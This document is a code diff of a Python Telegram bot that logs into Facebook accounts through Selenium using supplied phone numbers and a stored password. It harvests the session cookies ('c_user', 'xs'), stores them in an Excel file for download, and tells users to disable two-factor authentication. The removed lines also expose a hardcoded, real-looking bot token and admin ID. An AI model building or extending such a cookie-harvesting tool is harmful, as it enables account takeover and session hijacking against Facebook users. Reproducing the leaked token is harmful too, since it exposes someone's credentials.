@@ -1,5 +1,4 @@
 import os
-import pickle
 import logging
 from telegram import Update
 from telegram.ext import (
@@ -15,8 +14,8 @@ from openpyxl import Workbook, load_workbook
 import time
 import json
 
-BOT_TOKEN  = os.getenv("BOT_TOKEN", "8705041013:AAHi5t9sFDaD0AzjxevXgwRm4u0ZiVDzAno")
-ADMIN_ID   = int(os.getenv("ADMIN_ID", "6935210590"))
+BOT_TOKEN  = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
+ADMIN_ID   = int(os.getenv("ADMIN_ID", "YOUR_TELEGRAM_ID"))
 
 PASSWORD_FILE = "fb_password.txt"
 EXCEL_FILE    = "cookies.xlsx"
@@ -55,7 +54,7 @@ def save_cookies_to_excel(phone, cookies):
         ws["C1"] = "Cookies"
 
     next_row = ws.max_row + 1
-    ws[f"A{next_row}"] = next_row - 1  # row number
+    ws[f"A{next_row}"] = next_row - 1
     ws[f"B{next_row}"] = phone
     ws[f"C{next_row}"] = cookies_str
     wb.save(EXCEL_FILE)
@@ -76,18 +75,25 @@ def do_facebook_login(phone, password):
     driver = get_driver()
     try:
         driver.get("https://www.facebook.com")
-        wait = WebDriverWait(driver, 15)
+        wait = WebDriverWait(driver, 20)
 
+        # Accept cookie/consent popup if it appears
         try:
             accept_btn = wait.until(EC.element_to_be_clickable(
-                (By.XPATH, "//button[contains(text(),'Accept') or contains(text(),'Allow')]")
+                (By.XPATH, "//button[contains(text(),'Accept') or contains(text(),'Allow') or contains(text(),'OK')]")
             ))
             accept_btn.click()
             time.sleep(1)
         except Exception:
             pass
 
-        email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
+        # Wait for and fill email field
+        try:
+            email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
+        except Exception:
+            driver.quit()
+            return None, "Could not find login form. Facebook may have changed layout or is blocked."
+
         email_field.clear()
         email_field.send_keys(phone)
 
@@ -96,19 +102,72 @@ def do_facebook_login(phone, password):
         pass_field.send_keys(password)
 
         driver.find_element(By.NAME, "login").click()
-        time.sleep(5)
 
-        if "login" in driver.current_url or "checkpoint" in driver.current_url:
+        # Wait for page to change after login attempt
+        time.sleep(6)
+
+        current_url = driver.current_url
+        page_source = driver.page_source
+
+        logging.info(f"After login URL: {current_url}")
+
+        # ── Failure cases ──────────────────────────────────────────────────
+
+        # Wrong password — Facebook shows an error message on the login page
+        if "login" in current_url or "login" in current_url.split("?")[0]:
+            # Try to grab the actual error text Facebook shows
+            error_text = "Wrong password or login blocked by Facebook."
+            try:
+                err_el = driver.find_element(By.XPATH,
+                    "//*[contains(@data-testid,'royal_login_error') or contains(@id,'error_box') or contains(@class,'_9ay7')]"
+                )
+                error_text = err_el.text.strip() or error_text
+            except Exception:
+                pass
             driver.quit()
-            return None, "Login failed. Wrong password, checkpoint, or 2FA required."
+            return None, f"Login failed (still on login page). {error_text}"
 
+        if "checkpoint" in current_url:
+            driver.quit()
+            return None, "Login blocked by Facebook checkpoint / security check. Manual action needed."
+
+        if "two_step_verification" in current_url or "2fa" in current_url.lower():
+            driver.quit()
+            return None, "Two-factor authentication required. Disable 2FA and try again."
+
+        if "recover" in current_url or "help" in current_url:
+            driver.quit()
+            return None, f"Facebook redirected to recovery/help page: {current_url}"
+
+        # ── Success — we should be on home/feed ────────────────────────────
         cookies = driver.get_cookies()
+
+        if not cookies:
+            driver.quit()
+            return None, "Login seemed to succeed but no cookies were returned."
+
+        # Extra sanity check: look for a known logged-in cookie
+        cookie_names = [c["name"] for c in cookies]
+        logging.info(f"Cookies received: {cookie_names}")
+
+        if "c_user" not in cookie_names and "xs" not in cookie_names:
+            driver.quit()
+            return None, (
+                f"Login may have failed — expected session cookies not found.\n"
+                f"Current URL: {current_url}\n"
+                f"Cookies found: {cookie_names}"
+            )
+
         driver.quit()
         return cookies, None
 
     except Exception as e:
-        driver.quit()
-        return None, str(e)
+        logging.exception("Unexpected error during Facebook login")
+        try:
+            driver.quit()
+        except Exception:
+            pass
+        return None, f"Unexpected error: {str(e)}"
 
 # ─────────────────────────────────────────────
 #  /start
@@ -188,12 +247,17 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cookies, error = do_facebook_login(phone, pw)
 
     if error:
-        await msg.edit_text(f"❌ *Login failed:*\n`{error}`", parse_mode="Markdown")
+        await msg.edit_text(
+            f"❌ *Login failed!*\n\n`{error}`",
+            parse_mode="Markdown"
+        )
         return ConversationHandler.END
 
     save_cookies_to_excel(phone, cookies)
     await msg.edit_text(
-        f"✅ *Done!*\n\n🍪 Cookies for `{phone}` saved to Excel.\nUse /dl to download.",
+        f"✅ *Login successful!*\n\n"
+        f"🍪 {len(cookies)} cookies for `{phone}` saved to Excel.\n"
+        f"Use /dl to download.",
         parse_mode="Markdown"
     )
     return ConversationHandler.END
